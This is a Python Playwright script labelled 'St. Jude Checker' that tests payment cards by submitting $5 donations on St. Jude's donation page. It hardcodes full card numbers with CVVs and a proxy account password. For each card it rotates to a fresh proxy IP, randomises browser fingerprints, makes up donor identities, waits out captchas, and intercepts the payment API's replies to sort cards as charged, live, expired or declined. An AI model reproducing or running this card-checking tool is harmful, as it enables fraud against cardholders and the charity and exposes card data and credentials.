import re
import os
import time
import json
import random
from playwright.sync_api import sync_playwright


# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════

CARDS = [
    "5126693793783705|08|2030|560",
    "5286893388179535|11|2026|595",
    "5524336973513710|02|30|819",
    "4815830046733918|03|2031|318",
    "5362199060708113|06|2030|446",
]

BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"
BD_PASS = "eyr0v46j28pi"
BD_CUSTOMER = "brd-customer-hl_24c8058e-zone-scraping_browser1"

DONATE_URL = "https://www.stjude.org/donate/donate-to-st-jude.html"

MAX_RESPONSE_WAIT = 60

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller"]

ADDRESSES = [
    {"a1": "1600 Amphitheatre Pkwy", "c": "Mountain View", "s": "CA", "z": "94043"},
    {"a1": "350 Fifth Avenue", "c": "New York", "s": "NY", "z": "10118"},
    {"a1": "233 S Wacker Dr", "c": "Chicago", "s": "IL", "z": "60606"},
    {"a1": "1 Microsoft Way", "c": "Redmond", "s": "WA", "z": "98052"},
    {"a1": "4 Yawkey Way", "c": "Boston", "s": "MA", "z": "02215"},
]


# ═══════════════════════════════════════════════════════════
# RESPONSE MAPPING
# ═══════════════════════════════════════════════════════════

REASON_MAP = {
    # ═══ Charge ═══
    'Approved': 'CHARGE $5',
    'Success': 'CHARGE $5',
    'Charged': 'CHARGE $5',
    'Completed': 'CHARGE $5',
    'Authorized': 'CHARGE $5',
    'Captured': 'CHARGE $5',

    # ═══ Live ═══
    'CreditCardInsufficientFunds': 'LIVE',
    'InsufficientFunds': 'LIVE',

    # ═══ Expired ═══
    'CreditCardExpired': 'EXPIRED',
    'ExpiredCard': 'EXPIRED',

    # ═══ SERVER ERROR ═══
    'APGTimeoutError': 'SERVER_ERROR',
    'InternalServerError': 'SERVER_ERROR',
    'timeout': 'SERVER_ERROR',
    'error': 'SERVER_ERROR',
    'javascriptException': 'SERVER_ERROR',
}


def make_email(f, l):
    return f"{f.lower()}{l.lower()}{random.randint(100,999)}@gmail.com"


def get_random_ua():
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    ]
    return random.choice(uas)


def connect_browser_with_random_ip(p):
    session_id = random.randint(1000000, 9999999)
    username = f"{BD_CUSTOMER}-session-{session_id}"

    cdp_url = f"wss://{username}:{BD_PASS}@{BD_HOST}:{BD_PORT}"

    print(f"🌐 Connecting with session: {session_id}...", flush=True)

    browser = p.chromium.connect_over_cdp(cdp_url, timeout=120000)

    print(f"✅ Connected with new IP", flush=True)

    return browser


def check_card(browser, card, idx, total):
    t0 = time.time()
    result_code = "UNKNOWN"
    result_text = ""

    parts = card.strip().split("|")
    if len(parts) < 4:
        return ("INVALID_FORMAT", "Bad format", 0)

    num, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
    if len(yy) == 2:
        yy = "20" + yy

    print(f"\n{'='*60}", flush=True)
    print(f"🔍 [{idx}/{total}] {num[:6]}****{num[-4:]}", flush=True)
    print(f"{'='*60}", flush=True)

    context = None

    try:
        # ═══ جلسة جديدة لكل كارت — من غير extra_http_headers ═══
        ua = get_random_ua()

        context = browser.new_context(
            viewport={"width": random.randint(1280, 1920), "height": random.randint(720, 1080)},
            user_agent=ua,
            locale="en-US",
            timezone_id="America/New_York",
            geolocation={"latitude": 40.7128, "longitude": -74.0060},
            permissions=["geolocation"],
        )

        page = context.new_page()

        # ═══ Intercept Responses ═══
        page.add_init_script("""
            window.__all_responses = [];

            const origFetch = window.fetch;
            window.fetch = async function(...args) {
                const response = await origFetch.apply(this, args);
                const url = typeof args[0] === 'string' ? args[0] : (args[0]?.url || '');
                try {
                    const clone = response.clone();
                    const body = await clone.text();
                    window.__all_responses.push({
                        url: url,
                        status: response.status,
                        body: body
                    });
                } catch(e) {}
                return response;
            };

            const origOpen = XMLHttpRequest.prototype.open;
            const origSend = XMLHttpRequest.prototype.send;

            XMLHttpRequest.prototype.open = function(m, u) {
                this.__url = u;
                return origOpen.apply(this, arguments);
            };

            XMLHttpRequest.prototype.send = function() {
                this.addEventListener('load', function() {
                    window.__all_responses.push({
                        url: this.__url || '',
                        status: this.status,
                        body: this.responseText || ''
                    });
                });
                return origSend.apply(this, arguments);
            };
        """)

        # ═══ فتح الصفحة ═══
        print(f"📄 Loading page...", flush=True)

        try:
            page.goto(DONATE_URL, timeout=60000, wait_until="domcontentloaded")
        except Exception as e:
            print(f"⚠️ Nav: {str(e)[:80]}", flush=True)

        # ═══ انتظر تحميل كامل ═══
        print(f"⏳ Waiting for full load...", flush=True)
        time.sleep(random.uniform(5, 8))

        # ═══ انتظر cookies تتولد ═══
        print(f"🍪 Waiting for cookies...", flush=True)
        time.sleep(random.uniform(3, 5))

        # ═══ Check captcha/robot ═══
        try:
            body_text = page.inner_text("body")
            if "robot" in body_text.lower() or "captcha" in body_text.lower():
                print("⚠️ Captcha detected, waiting 15s...", flush=True)
                time.sleep(15)
                page.reload(wait_until="domcontentloaded")
                time.sleep(5)
        except:
            pass

        # ═══ Other Payment Options ═══
        try:
            page.wait_for_selector("#continue-to-other-payment", timeout=25000, state="visible")
            page.click("#continue-to-other-payment")
            print("👆 Other Payment", flush=True)
            time.sleep(2)
        except:
            print("⚠️ No other payment btn", flush=True)

        # ═══ Credit Card ═══
        try:
            page.wait_for_selector("#cc-link", timeout=25000, state="visible")
            page.click("#cc-link")
            print("👆 Credit Card", flush=True)
            time.sleep(2)
        except:
            print("⚠️ No CC btn", flush=True)

        # ═══ انتظار الفورم ═══
        try:
            page.wait_for_selector("#cardNumber", timeout=30000, state="visible")
            print("✅ Form ready", flush=True)
        except:
            print(f"❌ No form", flush=True)
            try:
                context.close()
            except:
                pass
            return ("NO_FORM", "Form not found", round(time.time() - t0, 1))

        # ═══ Fill Form ═══
        f = random.choice(FIRST_NAMES)
        l = random.choice(LAST_NAMES)
        em = make_email(f, l)
        ad = random.choice(ADDRESSES)
        ph = f"{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"

        print("📝 Filling form...", flush=True)

        page.fill("#cardNumber", num)
        page.fill("#expMonth", mm)
        page.fill("#expYear", yy[2:] if len(yy) == 4 else yy)
        page.fill("#cardCvv2", cvv)

        try:
            page.fill("#donationAmountOther", "5")
        except:
            pass

        page.fill("#firstName", f)
        page.fill("#lastName", l)
        page.fill("#email", em)
        page.fill("#address1", ad["a1"])
        page.fill("#city", ad["c"])

        try:
            page.select_option("#stateProvince", ad["s"])
        except:
            pass

        page.fill("#zipPostalCode", ad["z"])

        try:
            page.fill("#phoneNumber", ph)
        except:
            pass

        print("✅ Form filled", flush=True)

        # ═══ انتظر زي البشر ═══
        time.sleep(random.uniform(1.5, 3))

        # ═══ Click Donate ═══
        print("👆 Clicking Donate...", flush=True)
        try:
            page.click("#donateButton")
        except:
            pass

        # ═══ انتظار الرد ═══
        print("⏳ Waiting for response...", flush=True)

        for i in range(MAX_RESPONSE_WAIT):
            time.sleep(1)

            try:
                responses = page.evaluate("() => window.__all_responses || []")

                for resp in reversed(responses):
                    url = resp.get('url', '')
                    body = resp.get('body', '')

                    if '/oms/v1/order' not in url:
                        continue

                    if not body:
                        continue

                    try:
                        data = json.loads(body)
                        reason = data.get('reason', '')
                        description = data.get('description', '')

                        if reason:
                            result_code = REASON_MAP.get(reason, 'DECLINED')
                            result_text = f"{reason}: {description}"[:200]
                            break
                    except:
                        pass

                if result_code != "UNKNOWN":
                    break
            except:
                pass

            try:
                page_text = page.inner_text("body")
                text_lower = page_text.lower()

                if "insufficient funds" in text_lower:
                    result_code = "LIVE"
                    result_text = "Insufficient Funds"
                    break

                if "card has expired" in text_lower or "past expiration" in text_lower:
                    result_code = "EXPIRED"
                    result_text = "Card Expired"
                    break

                if "thank you for your donation" in text_lower or "donation was successful" in text_lower:
                    result_code = "CHARGE $5"
                    result_text = "Approved"
                    break
            except:
                pass

        try:
            context.close()
        except:
            pass

    except Exception as e:
        print(f"❌ Error: {str(e)[:150]}", flush=True)
        result_code = "ERROR"
        result_text = str(e)[:100]
        if context:
            try:
                context.close()
            except:
                pass

    elapsed = round(time.time() - t0, 1)

    print(f"📝 {result_code}", flush=True)
    if result_text:
        print(f"   {result_text}", flush=True)
    print(f"⏱️ {elapsed}s", flush=True)

    return (result_code, result_text, elapsed)


def main():
    print("=" * 60, flush=True)
    print("  St. Jude Checker — v21 (Fixed Headers)", flush=True)
    print("=" * 60, flush=True)
    print(f"📁 Cards: {len(CARDS)}", flush=True)
    print("=" * 60, flush=True)

    results = []
    t_start = time.time()

    try:
        with sync_playwright() as p:
            for idx, card in enumerate(CARDS, 1):
                print(f"\n🔄 Getting fresh IP for card {idx}...", flush=True)

                browser = None
                try:
                    browser = connect_browser_with_random_ip(p)

                    code, text, elapsed = check_card(browser, card, idx, len(CARDS))

                except Exception as e:
                    print(f"❌ Card error: {str(e)[:150]}", flush=True)
                    code, text, elapsed = "ERROR", str(e)[:100], 0
                finally:
                    if browser:
                        try:
                            browser.close()
                        except:
                            pass

                results.append({
                    'card': card,
                    'code': code,
                    'text': text,
                    'elapsed': elapsed,
                })

                if idx < len(CARDS):
                    wait_time = random.uniform(5, 10)
                    print(f"\n⏸️ Waiting {wait_time:.1f}s...", flush=True)
                    time.sleep(wait_time)

    except Exception as e:
        print(f"❌ Main error: {str(e)[:200]}", flush=True)

    total_time = round(time.time() - t_start, 1)

    print("\n" + "=" * 60, flush=True)
    print("📊 FINAL RESULTS", flush=True)
    print("=" * 60, flush=True)

    charge_count = 0
    live_count = 0
    expired_count = 0
    declined_count = 0
    error_count = 0

    for r in results:
        card = r['card']
        code = r['code']
        text = r['text']
        elapsed = r['elapsed']

        if code == "CHARGE $5":
            status = "💎 CHARGE"
            charge_count += 1
        elif code == "LIVE":
            status = "💎 LIVE"
            live_count += 1
        elif code == "EXPIRED":
            status = "⏰ EXPIRED"
            expired_count += 1
        elif code == "SERVER_ERROR":
            status = "⚠️ SERVER_ERROR"
            error_count += 1
        elif code in ["ERROR", "NO_FORM", "UNKNOWN"]:
            status = "⚠️ ERROR"
            error_count += 1
        else:
            status = "❌ DECLINED"
            declined_count += 1

        print(f"\n💳 {card}", flush=True)
        print(f"   📝 {code}", flush=True)
        if text:
            print(f"   💬 {text}", flush=True)
        print(f"   {status} | ⏱️ {elapsed}s", flush=True)

    print("\n" + "=" * 60, flush=True)
    print(f"💎 Charge: {charge_count}", flush=True)
    print(f"💎 Live: {live_count}", flush=True)
    print(f"⏰ Expired: {expired_count}", flush=True)
    print(f"❌ Declined: {declined_count}", flush=True)
    print(f"⚠️ Errors: {error_count}", flush=True)
    print(f"⏱️ Total: {total_time}s ({round(total_time/60, 1)} min)", flush=True)
    print("=" * 60, flush=True)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Stopped", flush=True)
    except Exception as e:
        print(f"\n❌ Error: {str(e)[:200]}", flush=True)
